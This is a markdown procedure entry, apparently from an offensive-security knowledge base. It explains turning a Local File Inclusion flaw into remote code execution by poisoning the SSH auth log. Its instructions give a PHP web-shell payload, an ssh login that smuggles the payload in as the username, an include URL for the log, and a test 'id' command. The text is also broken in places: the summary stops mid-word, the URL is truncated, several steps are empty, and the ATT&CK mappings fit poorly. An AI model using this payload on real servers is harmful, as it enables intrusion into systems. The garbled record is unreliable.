---
id: f757a935-e587-4012-8acd-7bda15f9d1f6
name: LFI to RCE via SSH Log File Inclusion
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.581638+00:00'
updated_at: '2023-04-10T20:22:20.462052+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Data Staged|T1074 - Data Staged]]'
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Third-party Software|T1072 - Third-party Software]]'
tags:
- '[[File Inclusion]]'
- '[[LFI to RCE via controlled log file]]'
- '[[RCE via SSH]]'
commands:
- '[[Execute Command ''id'']]'
---

# LFI to RCE via SSH Log File Inclusion

## Summary

This procedure involves exploiting a Local File Inclusion (LFI) vulnerability to achieve Remote Code Execution (RCE) via an SSH log file. The attacker first inserts a PHP code into the SSH log file, which is then included in the web application through an LFI vulnerability. The attacker can then ex

## Description

# Description

This procedure involves exploiting a Local File Inclusion (LFI) vulnerability to achieve Remote Code Execution (RCE) via an SSH log file. The attacker first inserts a PHP code into the SSH log file, which is then included in the web application through an LFI vulnerability. The attacker can then execute arbitrary commands on the target system via the PHP code included in the log file. This technique can be used to gain initial access to a system and escalate privileges.

## Requirements

1. Access to a web application with an LFI vulnerability

1. Ability to modify the SSH log file

## Defense

1. Implement input validation to prevent LFI vulnerabilities

1. Monitor log files for unusual activity

1. Restrict access to log files

## Objectives

1. Gain initial access to the target system

1. Escalate privileges on the target system

1. Execute arbitrary commands on the target system

# Instructions

1. echo "<?php system($_GET[\"cmd\"]);?>" >> /var/log/auth.log

**Code**: [[<?php system($_GET["cmd"]);?>]]

> This command appends the PHP code to the end of the SSH log file.

2. 

**Code**: [[ssh <?php system($_GET["cmd"]);?>@10.10.10.10]]

> 

3. 

**Code**: [[http://example.com/index.php?page=/var/log/auth.lo]]

> 

**Command** ([[Execute Command 'id']]):

```bash
id
```

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Data Staged|T1074 - Data Staged]]
- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Third-party Software|T1072 - Third-party Software]]

## Commands Used

- [[Execute Command 'id']]

## Tags

- [[File Inclusion]]
- [[LFI to RCE via controlled log file]]
- [[RCE via SSH]]
